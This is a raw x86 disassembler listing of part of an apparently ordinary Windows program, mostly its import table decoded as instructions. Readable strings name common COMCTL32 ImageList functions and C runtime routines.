  427c0a:	add    BYTE PTR [edi-0x2efffd72],bh
  427c10:	mov    es,WORD PTR [edx]
  427c12:	add    bl,ah
  427c14:	mov    es,WORD PTR [edx]
  427c16:	add    bh,dh
  427c18:	mov    es,WORD PTR [edx]
  427c1a:	add    BYTE PTR [ebx],cl
  427c1c:	pop    DWORD PTR [edx]
  427c1e:	add    BYTE PTR ds:0x3300028f,bl
  427c24:	pop    DWORD PTR [edx]
  427c26:	add    BYTE PTR [ebp-0x71],al
  427c29:	add    al,BYTE PTR [eax]
  427c2b:	popa   
  427c2c:	pop    DWORD PTR [edx]
  427c2e:	add    BYTE PTR [edi-0x71],dh
  427c31:	add    al,BYTE PTR [eax]
  427c33:	test   DWORD PTR [edi-0x7066fffe],ecx
  427c39:	add    al,BYTE PTR [eax]
  427c3b:	add    BYTE PTR [eax],al
  427c3d:	add    BYTE PTR [eax],al
  427c3f:	mov    bl,0x8f
  427c41:	add    al,BYTE PTR [eax]
  427c43:	ret    
  427c44:	pop    DWORD PTR [edx]
  427c46:	add    bl,bl
  427c48:	pop    DWORD PTR [edx]
  427c4a:	add    ch,ah
  427c4c:	pop    DWORD PTR [edx]
  427c4e:	add    ch,dh
  427c50:	pop    DWORD PTR [edx]
  427c52:	add    BYTE PTR [ecx],cl
  427c54:	nop
  427c55:	add    al,BYTE PTR [eax]
  427c57:	pop    ss
  427c58:	nop
  427c59:	add    al,BYTE PTR [eax]
  427c5b:	sub    edx,DWORD PTR [eax-0x6fc0fffe]
  427c61:	add    al,BYTE PTR [eax]
  427c63:	dec    edi
  427c64:	nop
  427c65:	add    al,BYTE PTR [eax]
  427c67:	pop    ebp
  427c68:	nop
  427c69:	add    al,BYTE PTR [eax]
  427c6b:	addr16 nop
  427c6d:	add    al,BYTE PTR [eax]
  427c6f:	jns    0x427c01
  427c71:	add    al,BYTE PTR [eax]
  427c73:	lea    edx,[eax-0x6f66fffe]
  427c79:	add    al,BYTE PTR [eax]
  427c7b:	scas   eax,DWORD PTR es:[edi]
  427c7c:	nop
  427c7d:	add    al,BYTE PTR [eax]
  427c7f:	ret    
  427c80:	nop
  427c81:	add    al,BYTE PTR [eax]
  427c83:	rcl    DWORD PTR [eax-0x6f1afffe],1
  427c89:	add    al,BYTE PTR [eax]
  427c8b:	stc    
  427c8c:	nop
  427c8d:	add    al,BYTE PTR [eax]
  427c8f:	add    eax,0x11000291
  427c94:	xchg   ecx,eax
  427c95:	add    al,BYTE PTR [eax]
  427c97:	daa    
  427c98:	xchg   ecx,eax
  427c99:	add    al,BYTE PTR [eax]
  427c9b:	xor    eax,0x41000291
  427ca0:	xchg   ecx,eax
  427ca1:	add    al,BYTE PTR [eax]
  427ca3:	push   ebx
  427ca4:	xchg   ecx,eax
  427ca5:	add    al,BYTE PTR [eax]
  427ca7:	imul   edx,DWORD PTR [ecx-0x6e88fffe],0x918b0002
  427cb1:	add    al,BYTE PTR [eax]
  427cb3:	fwait
  427cb4:	xchg   ecx,eax
  427cb5:	add    al,BYTE PTR [eax]
  427cb7:	stos   DWORD PTR es:[edi],eax
  427cb8:	xchg   ecx,eax
  427cb9:	add    al,BYTE PTR [eax]
  427cbb:	mov    ecx,0xc3000291
  427cc0:	xchg   ecx,eax
  427cc1:	add    al,BYTE PTR [eax]
  427cc3:	int    0x91
  427cc5:	add    al,BYTE PTR [eax]
  427cc7:	fst    DWORD PTR [ecx-0x6e1afffe]
  427ccd:	add    al,BYTE PTR [eax]
  427ccf:	not    DWORD PTR [ecx-0x6df2fffe]
  427cd5:	add    al,BYTE PTR [eax]
  427cd7:	daa    
  427cd8:	xchg   edx,eax
  427cd9:	add    al,BYTE PTR [eax]
  427cdb:	aaa    
  427cdc:	xchg   edx,eax
  427cdd:	add    al,BYTE PTR [eax]
  427cdf:	inc    ecx
  427ce0:	xchg   edx,eax
  427ce1:	add    al,BYTE PTR [eax]
  427ce3:	push   ecx
  427ce4:	xchg   edx,eax
  427ce5:	add    al,BYTE PTR [eax]
  427ce7:	arpl   WORD PTR [edx-0x6d8efffe],dx
  427ced:	add    al,BYTE PTR [eax]
  427cef:	mov    edx,DWORD PTR [edx+0x2]
  427cf5:	add    BYTE PTR [eax],al
  427cf7:	inc    edx
  427cf8:	xor    al,0x10
  427cfa:	add    cl,dl
  427cfc:	add    dl,BYTE PTR [eax]
  427cfe:	add    BYTE PTR [edi],bh
  427d00:	jge    0x427d12
  427d02:	add    BYTE PTR ds:0xe1001070,dl
  427d08:	jae    0x427d1a
  427d0a:	add    BYTE PTR [esi-0x52ffeff5],al
  427d10:	jae    0x427d22
  427d12:	add    BYTE PTR [edx+0x25],ah
  427d15:	adc    BYTE PTR [eax],al
  427d17:	je     0x427d44
  427d19:	adc    BYTE PTR [eax],al
  427d1b:	sahf   
  427d1c:	jp     0x427d2e
  427d1e:	add    BYTE PTR [edi],ch
  427d20:	adc    BYTE PTR [eax],dl
	...
  427d2a:	add    BYTE PTR [ebp+esi*2-0x6d],cl
  427d2e:	dec    ebp
  427d2f:	add    BYTE PTR [eax],al
  427d31:	add    BYTE PTR [eax],al
  427d33:	pop    ecx
  427d34:	jge    0x427d38
  427d36:	add    BYTE PTR [ecx],al
  427d38:	add    BYTE PTR [eax],al
  427d3a:	add    BYTE PTR [ecx],al
  427d3c:	add    BYTE PTR [eax],al
  427d3e:	add    BYTE PTR [ecx],al
  427d40:	add    BYTE PTR [eax],al
  427d42:	add    BYTE PTR [edi+0x7d],cl
  427d45:	add    al,BYTE PTR [eax]
  427d47:	push   ebx
  427d48:	jge    0x427d4c
  427d4a:	add    BYTE PTR [edi+0x7d],dl
  427d4d:	add    al,BYTE PTR [eax]
  427d4f:	in     eax,dx
  427d50:	arpl   WORD PTR [eax],ax
  427d52:	add    BYTE PTR [edx+0x7d],ch
  427d55:	add    al,BYTE PTR [eax]
  427d57:	add    BYTE PTR [eax],al
  427d59:	dec    bp
  427d5b:	jno    0x427db2
  427d5d:	outs   dx,DWORD PTR ds:[esi]
  427d5e:	pop    ecx
  427d5f:	xor    al,0x55
  427d61:	jbe    0x427dd1
  427d63:	dec    eax
  427d64:	cs data16 ins BYTE PTR es:[di],dx
  427d68:	jo     0x427d6a
  427d6a:	aas    
  427d6b:	inc    edi
  427d6c:	outs   dx,BYTE PTR gs:[esi]
  427d6e:	gs jb  0x427dd2
  427d71:	je     0x427dd8
  427d73:	push   eax
  427d74:	outs   dx,DWORD PTR ds:[esi]
  427d75:	imul   ebp,DWORD PTR [esi+0x74],0x4077654e
  427d7c:	inc    eax
  427d7d:	pop    ecx
  427d7e:	inc    edi
  427d7f:	inc    esi
  427d80:	push   eax
  427d81:	inc    ecx
  427d82:	pop    edi
  427d83:	dec    esi
  427d84:	inc    esp
  427d85:	cmp    al,0x56
  427d87:	add    bh,dh
  427d89:	jl     0x427dcd
  427d8b:	add    bl,bh
  427d8d:	jl     0x427dd1
  427d8f:	add    bh,bh
  427d91:	jl     0x427dd5
  427d93:	add    BYTE PTR [ebx],al
  427d95:	jge    0x427dd9
  427d97:	add    BYTE PTR [edi],al
  427d99:	jge    0x427ddd
  427d9b:	add    BYTE PTR [ebx],cl
  427d9d:	jge    0x427de1
  427d9f:	add    BYTE PTR [edi],cl
  427da1:	jge    0x427de5
  427da3:	add    BYTE PTR [ebx],dl
  427da5:	jge    0x427de9
  427da7:	add    BYTE PTR [edi],dl
  427da9:	jge    0x427ded
  427dab:	add    BYTE PTR [ebx],bl
  427dad:	jge    0x427df1
  427daf:	add    BYTE PTR [edi],bl
  427db1:	jge    0x427df5
  427db3:	add    BYTE PTR [eax],al
  427db5:	add    BYTE PTR [eax],al
  427db7:	das    
  427db8:	jle    0x427dbc
	...
  427dc2:	add    bl,al
  427dc4:	add    BYTE PTR [edx],0x0
  427dc7:	out    0x78,eax
  427dc9:	add    al,BYTE PTR [eax]
  427dcb:	dec    ebx
  427dcc:	jle    0x427dd0
	...
  427dd6:	add    BYTE PTR [ebp+0x3000284],dh
  427ddc:	jns    0x427de0
  427dde:	add    bh,bh
  427de0:	jle    0x427de4
	...
  427dea:	add    BYTE PTR [edi-0x78],dl
  427ded:	add    al,BYTE PTR [eax]
  427def:	mov    bh,0x79
  427df1:	add    al,BYTE PTR [eax]
  427df3:	sar    DWORD PTR [edi+0x2],cl
	...
  427dfe:	add    BYTE PTR [edi-0x74fffd71],ah
  427e04:	jp     0x427e08
  427e06:	add    BYTE PTR [edi+0x281],al
  427e0c:	add    BYTE PTR [eax],al
  427e0e:	add    BYTE PTR [eax],al
  427e10:	add    BYTE PTR [eax],al
  427e12:	add    BYTE PTR [edi+0x3f000292],dl
  427e18:	jl     0x427e1c
	...
  427e2e:	add    BYTE PTR [edi],bh
  427e30:	add    BYTE PTR [edx],0x0
  427e33:	push   ecx
  427e34:	add    BYTE PTR [edx],0x0
  427e37:	imul   eax,DWORD PTR [edx-0x7d7efffe],0x82970002
  427e41:	add    al,BYTE PTR [eax]
  427e43:	stos   DWORD PTR es:[edi],eax
  427e44:	add    BYTE PTR [edx],0x0
  427e47:	add    BYTE PTR [eax],al
  427e49:	add    BYTE PTR [eax],al
  427e4b:	rol    DWORD PTR [edx-0x7d20fffe],1
  427e51:	add    al,BYTE PTR [eax]
  427e53:	jmp    0xf34280da
  427e58:	add    BYTE PTR [edx],0x0
  427e5b:	std    
  427e5c:	add    BYTE PTR [edx],0x0
  427e5f:	jae    0x835f7e67
  427e65:	add    al,BYTE PTR [eax]
  427e67:	and    eax,0x35000283
  427e6c:	add    DWORD PTR [edx],0x0
  427e6f:	aas    
  427e70:	add    DWORD PTR [edx],0x0
  427e73:	dec    ecx
  427e74:	add    DWORD PTR [edx],0x0
  427e77:	push   ebx
  427e78:	add    DWORD PTR [edx],0x0
  427e7b:	pop    ebp
  427e7c:	add    DWORD PTR [edx],0x0
  427e7f:	add    DWORD PTR [bp+si],0x0
  427e83:	jno    0x427e08
  427e85:	add    al,BYTE PTR [eax]
  427e87:	jns    0x427e0c
  427e89:	add    al,BYTE PTR [eax]
  427e8b:	add    DWORD PTR [ebx-0x7c74fffe],0x83950002
  427e95:	add    al,BYTE PTR [eax]
  427e97:	lahf   
  427e98:	add    DWORD PTR [edx],0x0
  427e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e9c:	add    DWORD PTR [edx],0x0
  427e9f:	mov    ch,0x83
  427ea1:	add    al,BYTE PTR [eax]
  427ea3:	rol    DWORD PTR [ebx-0x7c32fffe],0x2
  427eaa:	add    cl,bl
  427eac:	add    DWORD PTR [edx],0x0
  427eaf:	jecxz  0x427e34
  427eb1:	add    al,BYTE PTR [eax]
  427eb3:	out    dx,eax
  427eb4:	add    DWORD PTR [edx],0x0
  427eb7:	std    
  427eb8:	add    DWORD PTR [edx],0x0
  427ebb:	pop    es
  427ebc:	test   BYTE PTR [edx],al
  427ebe:	add    BYTE PTR [ecx],dl
  427ec0:	test   BYTE PTR [edx],al
  427ec2:	add    BYTE PTR [edi],bl
  427ec4:	test   BYTE PTR [edx],al
  427ec6:	add    BYTE PTR [edi],ah
  427ec8:	test   BYTE PTR [edx],al
  427eca:	add    BYTE PTR [ecx],dh
  427ecc:	test   BYTE PTR [edx],al
  427ece:	add    BYTE PTR [ebx],bh
  427ed0:	test   BYTE PTR [edx],al
  427ed2:	add    BYTE PTR [ebp-0x7c],al
  427ed5:	add    al,BYTE PTR [eax]
  427ed7:	dec    ebp
  427ed8:	test   BYTE PTR [edx],al
  427eda:	add    BYTE PTR [edi-0x7c],dl
  427edd:	add    al,BYTE PTR [eax]
  427edf:	popa   
  427ee0:	test   BYTE PTR [edx],al
  427ee2:	add    BYTE PTR [ebx-0x7c],ch
  427ee5:	add    al,BYTE PTR [eax]
  427ee7:	jg     0x427e6d
  427ee9:	add    al,BYTE PTR [eax]
  427eeb:	mov    DWORD PTR [edx+eax*1+0x2849300],eax
  427ef2:	add    BYTE PTR [ebx-0x54fffd7c],bl
  427ef8:	test   BYTE PTR [edx],al
  427efa:	add    BYTE PTR [eax],al
  427efc:	add    BYTE PTR [eax],al
  427efe:	add    cl,al
  427f00:	test   BYTE PTR [edx],al
  427f02:	add    cl,bl
  427f04:	test   BYTE PTR [edx],al
  427f06:	add    bh,ah
  427f08:	test   BYTE PTR [edx],al
  427f0a:	add    bl,bh
  427f0c:	test   BYTE PTR [edx],al
  427f0e:	add    BYTE PTR ds:0x1d000285,cl
  427f14:	test   DWORD PTR [edx],eax
  427f16:	add    BYTE PTR [edi],ch
  427f18:	test   DWORD PTR [edx],eax
  427f1a:	add    BYTE PTR ds:0x51000285,bh
  427f20:	test   DWORD PTR [edx],eax
  427f22:	add    BYTE PTR [ecx-0x7b],ah
  427f25:	add    al,BYTE PTR [eax]
  427f27:	ja     0x427eae
  427f29:	add    al,BYTE PTR [eax]
  427f2b:	mov    eax,DWORD PTR [ebp-0x7a64fffe]
  427f31:	add    al,BYTE PTR [eax]
  427f33:	mov    ds:0xb9000285,eax
  427f38:	test   DWORD PTR [edx],eax
  427f3a:	add    cl,cl
  427f3c:	test   DWORD PTR [edx],eax
  427f3e:	add    ch,dl
  427f40:	test   DWORD PTR [edx],eax
  427f42:	add    bh,ah
  427f44:	test   DWORD PTR [edx],eax
  427f46:	add    cl,dh
  427f48:	test   DWORD PTR [edx],eax
  427f4a:	add    BYTE PTR [ebx],cl
  427f4c:	xchg   BYTE PTR [edx],al
  427f4e:	add    BYTE PTR [ecx],ah
  427f50:	xchg   BYTE PTR [edx],al
  427f52:	add    BYTE PTR ds:0x45000286,dh
  427f58:	xchg   BYTE PTR [edx],al
  427f5a:	add    BYTE PTR [ecx-0x7a],dl
  427f5d:	add    al,BYTE PTR [eax]
  427f5f:	popa   
  427f60:	xchg   BYTE PTR [edx],al
  427f62:	add    BYTE PTR [ebp-0x7a],ch
  427f65:	add    al,BYTE PTR [eax]
  427f67:	jg     0x427eef
  427f69:	add    al,BYTE PTR [eax]
  427f6b:	lea    eax,[esi-0x7964fffe]
  427f71:	add    al,BYTE PTR [eax]
  427f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f74:	xchg   BYTE PTR [edx],al
  427f76:	add    BYTE PTR [ecx-0x32fffd7a],bh
  427f7c:	xchg   BYTE PTR [edx],al
  427f7e:	add    cl,bl
  427f80:	xchg   BYTE PTR [edx],al
  427f82:	add    ch,ch
  427f84:	xchg   BYTE PTR [edx],al
  427f86:	add    bl,bh
  427f88:	xchg   BYTE PTR [edx],al
  427f8a:	add    BYTE PTR ds:0x1d000287,cl
  427f90:	xchg   DWORD PTR [edx],eax
  427f92:	add    BYTE PTR [ebx],ch
  427f94:	xchg   DWORD PTR [edx],eax
  427f96:	add    BYTE PTR [ecx-0x79],al
  427f99:	add    al,BYTE PTR [eax]
  427f9b:	dec    ebp
  427f9c:	xchg   DWORD PTR [edx],eax
  427f9e:	add    BYTE PTR [ebx-0x79],ah
  427fa1:	add    al,BYTE PTR [eax]
  427fa3:	jg     0x427f2c
  427fa5:	add    al,BYTE PTR [eax]
  427fa7:	xchg   ebx,eax
  427fa8:	xchg   DWORD PTR [edx],eax
  427faa:	add    BYTE PTR [edi-0x44fffd79],ah
  427fb0:	xchg   DWORD PTR [edx],eax
  427fb2:	add    cl,dl
  427fb4:	xchg   DWORD PTR [edx],eax
  427fb6:	add    cl,ch
  427fb8:	xchg   DWORD PTR [edx],eax
  427fba:	add    bh,dh
  427fbc:	xchg   DWORD PTR [edx],eax
  427fbe:	add    BYTE PTR [ecx],cl
  427fc0:	mov    BYTE PTR [edx],al
  427fc2:	add    BYTE PTR [edi],bl
  427fc4:	mov    BYTE PTR [edx],al
  427fc6:	add    BYTE PTR [ecx],dh
  427fc8:	mov    BYTE PTR [edx],al
  427fca:	add    BYTE PTR [ebp-0x78],al
  427fcd:	add    al,BYTE PTR [eax]
  427fcf:	add    BYTE PTR [eax],al
  427fd1:	add    BYTE PTR [eax],al
  427fd3:	mov    BYTE PTR gs:[edx],al
  427fd6:	add    BYTE PTR [ebx-0x78],dh
  427fd9:	add    al,BYTE PTR [eax]
  427fdb:	test   DWORD PTR [eax-0x7768fffe],ecx
  427fe1:	add    al,BYTE PTR [eax]
  427fe3:	mov    ds:0xb5000288,eax
  427fe8:	mov    BYTE PTR [edx],al
  427fea:	add    bh,al
  427fec:	mov    BYTE PTR [edx],al
  427fee:	add    bl,bl
  427ff0:	mov    BYTE PTR [edx],al
  427ff2:	add    bh,ah
  427ff4:	mov    BYTE PTR [edx],al
  427ff6:	add    ch,dh
  427ff8:	mov    BYTE PTR [edx],al
  427ffa:	add    BYTE PTR [ecx],al
  427ffc:	mov    DWORD PTR [edx],eax
  427ffe:	add    BYTE PTR [ebx],dl
  428000:	mov    DWORD PTR [edx],eax
  428002:	add    BYTE PTR [ecx],ah
  428004:	mov    DWORD PTR [edx],eax
  428006:	add    BYTE PTR [edi],ch
  428008:	mov    DWORD PTR [edx],eax
  42800a:	add    BYTE PTR [ebx-0x77],cl
  42800d:	add    al,BYTE PTR [eax]
  42800f:	pop    ebx
  428010:	mov    DWORD PTR [edx],eax
  428012:	add    BYTE PTR [ebp-0x77],dh
  428015:	add    al,BYTE PTR [eax]
  428017:	test   DWORD PTR [ecx-0x7664fffe],ecx
  42801d:	add    al,BYTE PTR [eax]
  42801f:	stos   DWORD PTR es:[edi],eax
  428020:	mov    DWORD PTR [edx],eax
  428022:	add    BYTE PTR [edi-0x34fffd77],dh
  428028:	mov    DWORD PTR [edx],eax
  42802a:	add    bl,ah
  42802c:	mov    DWORD PTR [edx],eax
  42802e:	add    bh,ch
  428030:	mov    DWORD PTR [edx],eax
  428032:	add    bh,bh
  428034:	mov    DWORD PTR [edx],eax
  428036:	add    BYTE PTR [ebx],cl
  428038:	mov    al,BYTE PTR [edx]
  42803a:	add    BYTE PTR [edi],dl
  42803c:	mov    al,BYTE PTR [edx]
  42803e:	add    BYTE PTR ds:0x2f00028a,ah
  428044:	mov    al,BYTE PTR [edx]
  428046:	add    BYTE PTR [edi],bh
  428048:	mov    al,BYTE PTR [edx]
  42804a:	add    BYTE PTR [ecx-0x76],dl
  42804d:	add    al,BYTE PTR [eax]
  42804f:	pop    ebp
  428050:	mov    al,BYTE PTR [edx]
  428052:	add    BYTE PTR [edi-0x76],ch
  428055:	add    al,BYTE PTR [eax]
  428057:	jnp    0x427fe3
  428059:	add    al,BYTE PTR [eax]
  42805b:	xchg   DWORD PTR [edx-0x7568fffe],ecx
  428061:	add    al,BYTE PTR [eax]
  428063:	lods   eax,DWORD PTR ds:[esi]
  428064:	mov    al,BYTE PTR [edx]
  428066:	add    BYTE PTR [ebx-0x32fffd76],bh
  42806c:	mov    al,BYTE PTR [edx]
  42806e:	add    ch,bl
  428070:	mov    al,BYTE PTR [edx]
  428072:	add    ch,ch
  428074:	mov    al,BYTE PTR [edx]
  428076:	add    BYTE PTR [ecx],cl
  428078:	mov    eax,DWORD PTR [edx]
  42807a:	add    BYTE PTR [ecx],bl
  42807c:	mov    eax,DWORD PTR [edx]
  42807e:	add    BYTE PTR [ecx],ch
  428080:	mov    eax,DWORD PTR [edx]
  428082:	add    BYTE PTR [edi],dh
  428084:	mov    eax,DWORD PTR [edx]
  428086:	add    BYTE PTR [ebp-0x75],cl
  428089:	add    al,BYTE PTR [eax]
  42808b:	pop    ebx
  42808c:	mov    eax,DWORD PTR [edx]
  42808e:	add    BYTE PTR [ebp-0x75],ah
  428091:	add    al,BYTE PTR [eax]
  428093:	jno    0x428020
  428095:	add    al,BYTE PTR [eax]
  428097:	or     DWORD PTR [ebx-0x7464fffe],0x2
  42809e:	add    BYTE PTR [ebp-0x42fffd75],ch
  4280a4:	mov    eax,DWORD PTR [edx]
  4280a6:	add    cl,dl
  4280a8:	mov    eax,DWORD PTR [edx]
  4280aa:	add    cl,ah
  4280ac:	mov    eax,DWORD PTR [edx]
  4280ae:	add    bh,dh
  4280b0:	mov    eax,DWORD PTR [edx]
  4280b2:	add    BYTE PTR ds:0x1900028c,al
  4280b8:	mov    WORD PTR [edx],es
  4280ba:	add    BYTE PTR [edi],ah
  4280bc:	mov    WORD PTR [edx],es
  4280be:	add    BYTE PTR [ecx],bh
  4280c0:	mov    WORD PTR [edx],es
  4280c2:	add    BYTE PTR [ebx-0x74],cl
  4280c5:	add    al,BYTE PTR [eax]
  4280c7:	pop    ebp
  4280c8:	mov    WORD PTR [edx],es
  4280ca:	add    BYTE PTR [ecx-0x74],ch
  4280cd:	add    al,BYTE PTR [eax]
  4280cf:	ja     0x42805d
  4280d1:	add    al,BYTE PTR [eax]
  4280d3:	lea    ecx,[edx+eax*1+0x28ca100]
  4280da:	add    BYTE PTR [ebp-0x38fffd74],dh
  4280e0:	mov    WORD PTR [edx],es
  4280e2:	add    cl,dl
  4280e4:	mov    WORD PTR [edx],es
  4280e6:	add    bl,ah
  4280e8:	mov    WORD PTR [edx],es
  4280ea:	add    bh,dh
  4280ec:	mov    WORD PTR [edx],es
  4280ee:	add    BYTE PTR [ebx],cl
  4280f0:	lea    eax,[edx]
  4280f2:	add    BYTE PTR [ebx],bl
  4280f4:	lea    eax,[edx]
  4280f6:	add    BYTE PTR [ecx],ch
  4280f8:	lea    eax,[edx]
  4280fa:	add    BYTE PTR [ebx-0x73],al
  4280fd:	add    al,BYTE PTR [eax]
  4280ff:	pop    ebx
  428100:	lea    eax,[edx]
  428102:	add    BYTE PTR [ecx-0x73],ch
  428105:	add    al,BYTE PTR [eax]
  428107:	jnp    0x428096
  428109:	add    al,BYTE PTR [eax]
  42810b:	mov    DWORD PTR [ebp-0x726afffe],ecx
  428111:	add    al,BYTE PTR [eax]
  428113:	scas   eax,DWORD PTR es:[edi]
  428114:	lea    eax,[edx]
  428116:	add    cl,al
  428118:	lea    eax,[edx]
  42811a:	add    bl,dl
  42811c:	lea    eax,[edx]
  42811e:	add    bl,ah
  428120:	lea    eax,[edx]
  428122:	add    bl,dh
  428124:	lea    eax,[edx]
  428126:	add    ch,bh
  428128:	lea    eax,[edx]
  42812a:	add    BYTE PTR ds:0x1f00028e,cl
  428130:	mov    es,WORD PTR [edx]
  428132:	add    BYTE PTR [edi],ch
  428134:	mov    es,WORD PTR [edx]
  428136:	add    BYTE PTR [ebp-0x72],al
  428139:	add    al,BYTE PTR [eax]
  42813b:	pop    ebp
  42813c:	mov    es,WORD PTR [edx]
  42813e:	add    BYTE PTR [edi-0x72],ch
  428141:	add    al,BYTE PTR [eax]
  428143:	jg     0x4280d3
  428145:	add    al,BYTE PTR [eax]
  428147:	xchg   ecx,eax
  428148:	mov    es,WORD PTR [edx]
  42814a:	add    BYTE PTR [edi-0x4efffd72],bl
  428150:	mov    es,WORD PTR [edx]
  428152:	add    BYTE PTR [edi-0x2efffd72],bh
  428158:	mov    es,WORD PTR [edx]
  42815a:	add    bl,ah
  42815c:	mov    es,WORD PTR [edx]
  42815e:	add    bh,dh
  428160:	mov    es,WORD PTR [edx]
  428162:	add    BYTE PTR [ebx],cl
  428164:	pop    DWORD PTR [edx]
  428166:	add    BYTE PTR ds:0x3300028f,bl
  42816c:	pop    DWORD PTR [edx]
  42816e:	add    BYTE PTR [ebp-0x71],al
  428171:	add    al,BYTE PTR [eax]
  428173:	popa   
  428174:	pop    DWORD PTR [edx]
  428176:	add    BYTE PTR [edi-0x71],dh
  428179:	add    al,BYTE PTR [eax]
  42817b:	test   DWORD PTR [edi-0x7066fffe],ecx
  428181:	add    al,BYTE PTR [eax]
  428183:	add    BYTE PTR [eax],al
  428185:	add    BYTE PTR [eax],al
  428187:	mov    bl,0x8f
  428189:	add    al,BYTE PTR [eax]
  42818b:	ret    
  42818c:	pop    DWORD PTR [edx]
  42818e:	add    bl,bl
  428190:	pop    DWORD PTR [edx]
  428192:	add    ch,ah
  428194:	pop    DWORD PTR [edx]
  428196:	add    ch,dh
  428198:	pop    DWORD PTR [edx]
  42819a:	add    BYTE PTR [ecx],cl
  42819c:	nop
  42819d:	add    al,BYTE PTR [eax]
  42819f:	pop    ss
  4281a0:	nop
  4281a1:	add    al,BYTE PTR [eax]
  4281a3:	sub    edx,DWORD PTR [eax-0x6fc0fffe]
  4281a9:	add    al,BYTE PTR [eax]
  4281ab:	dec    edi
  4281ac:	nop
  4281ad:	add    al,BYTE PTR [eax]
  4281af:	pop    ebp
  4281b0:	nop
  4281b1:	add    al,BYTE PTR [eax]
  4281b3:	addr16 nop
  4281b5:	add    al,BYTE PTR [eax]
  4281b7:	jns    0x428149
  4281b9:	add    al,BYTE PTR [eax]
  4281bb:	lea    edx,[eax-0x6f66fffe]
  4281c1:	add    al,BYTE PTR [eax]
  4281c3:	scas   eax,DWORD PTR es:[edi]
  4281c4:	nop
  4281c5:	add    al,BYTE PTR [eax]
  4281c7:	ret    
  4281c8:	nop
  4281c9:	add    al,BYTE PTR [eax]
  4281cb:	rcl    DWORD PTR [eax-0x6f1afffe],1
  4281d1:	add    al,BYTE PTR [eax]
  4281d3:	stc    
  4281d4:	nop
  4281d5:	add    al,BYTE PTR [eax]
  4281d7:	add    eax,0x11000291
  4281dc:	xchg   ecx,eax
  4281dd:	add    al,BYTE PTR [eax]
  4281df:	daa    
  4281e0:	xchg   ecx,eax
  4281e1:	add    al,BYTE PTR [eax]
  4281e3:	xor    eax,0x41000291
  4281e8:	xchg   ecx,eax
  4281e9:	add    al,BYTE PTR [eax]
  4281eb:	push   ebx
  4281ec:	xchg   ecx,eax
  4281ed:	add    al,BYTE PTR [eax]
  4281ef:	imul   edx,DWORD PTR [ecx-0x6e88fffe],0x918b0002
  4281f9:	add    al,BYTE PTR [eax]
  4281fb:	fwait
  4281fc:	xchg   ecx,eax
  4281fd:	add    al,BYTE PTR [eax]
  4281ff:	stos   DWORD PTR es:[edi],eax
  428200:	xchg   ecx,eax
  428201:	add    al,BYTE PTR [eax]
  428203:	mov    ecx,0xc3000291
  428208:	xchg   ecx,eax
  428209:	add    al,BYTE PTR [eax]
  42820b:	int    0x91
  42820d:	add    al,BYTE PTR [eax]
  42820f:	fst    DWORD PTR [ecx-0x6e1afffe]
  428215:	add    al,BYTE PTR [eax]
  428217:	not    DWORD PTR [ecx-0x6df2fffe]
  42821d:	add    al,BYTE PTR [eax]
  42821f:	daa    
  428220:	xchg   edx,eax
  428221:	add    al,BYTE PTR [eax]
  428223:	aaa    
  428224:	xchg   edx,eax
  428225:	add    al,BYTE PTR [eax]
  428227:	inc    ecx
  428228:	xchg   edx,eax
  428229:	add    al,BYTE PTR [eax]
  42822b:	push   ecx
  42822c:	xchg   edx,eax
  42822d:	add    al,BYTE PTR [eax]
  42822f:	arpl   WORD PTR [edx-0x6d8efffe],dx
  428235:	add    al,BYTE PTR [eax]
  428237:	mov    edx,DWORD PTR [edx+0x2]
  42823d:	add    BYTE PTR [eax],al
  42823f:	pop    esp
  428240:	add    BYTE PTR [eax+0x72],dl
  428243:	outs   dx,DWORD PTR ds:[esi]
  428244:	jo     0x4282ab
  428246:	jb     0x4282bc
  428248:	jns    0x42829d
  42824a:	push   0x57746565
  42824f:	add    BYTE PTR [eax],al
  428251:	push   ebx
  428252:	add    BYTE PTR [ecx+0x6d],cl
  428255:	popa   
  428256:	addr16 gs dec esp
  428259:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  428260:	dec    ecx
  428261:	arpl   WORD PTR [edi+0x6e],bp
  428264:	push   ebx
  428265:	imul   edi,DWORD PTR [edx+0x65],0x49004e00
  42826c:	ins    DWORD PTR es:[edi],dx
  42826d:	popa   
  42826e:	addr16 gs dec esp
  428271:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428278:	ins    BYTE PTR es:[edi],dx
  428279:	popa   
  42827a:	arpl   WORD PTR [ebp+0x49],sp
  42827d:	arpl   WORD PTR [edi+0x6e],bp
  428280:	add    BYTE PTR [eax+eax*1],ch
  428283:	dec    ecx
  428284:	ins    DWORD PTR es:[edi],dx
  428285:	popa   
  428286:	addr16 gs dec esp
  428289:	imul   esi,DWORD PTR [ebx+0x74],0x6464415f
  428290:	dec    ebp
  428291:	popa   
  428292:	jae    0x4282ff
  428294:	gs add BYTE PTR fs:[eax],dh
  428298:	add    BYTE PTR [ecx+0x6d],cl
  42829b:	popa   
  42829c:	addr16 gs dec esp
  42829f:	imul   esi,DWORD PTR [ebx+0x74],0x6572435f
  4282a6:	popa   
  4282a7:	je     0x42830e
  4282a9:	add    BYTE PTR [eax],al
  4282ab:	inc    ebp
  4282ac:	add    BYTE PTR [ecx+0x6d],cl
  4282af:	popa   
  4282b0:	addr16 gs dec esp
  4282b3:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4282ba:	fs dec ecx
  4282bc:	ins    DWORD PTR es:[edi],dx
  4282bd:	popa   
  4282be:	addr16 gs push edi
  4282c1:	add    BYTE PTR [eax],al
  4282c3:	inc    ebx
  4282c4:	dec    edi
  4282c5:	dec    ebp
  4282c6:	inc    ebx
  4282c7:	push   esp
  4282c8:	dec    esp
  4282c9:	xor    esi,DWORD PTR [edx]
  4282cb:	cs fs ins BYTE PTR es:[edi],dx
  4282ce:	ins    BYTE PTR es:[edi],dx
  4282cf:	add    BYTE PTR [eax],al
  4282d1:	cmc    
  4282d2:	add    BYTE PTR [edi+0x63],bl
  4282d5:	outs   dx,DWORD PTR ds:[esi]
  4282d6:	outs   dx,BYTE PTR ds:[esi]
  4282d7:	je     0x42834b
  4282d9:	outs   dx,DWORD PTR ds:[esi]
  4282da:	ins    BYTE PTR es:[edi],dx
  4282db:	data16 jo 0x4282de
  4282de:	add    BYTE PTR [ebx+0x3],bl
  4282e1:	bound  esi,QWORD PTR [ebx+0x65]
  4282e4:	popa   
  4282e5:	jb     0x42834a
  4282e7:	push   0x69039b00
  4282ec:	jae    0x42835e
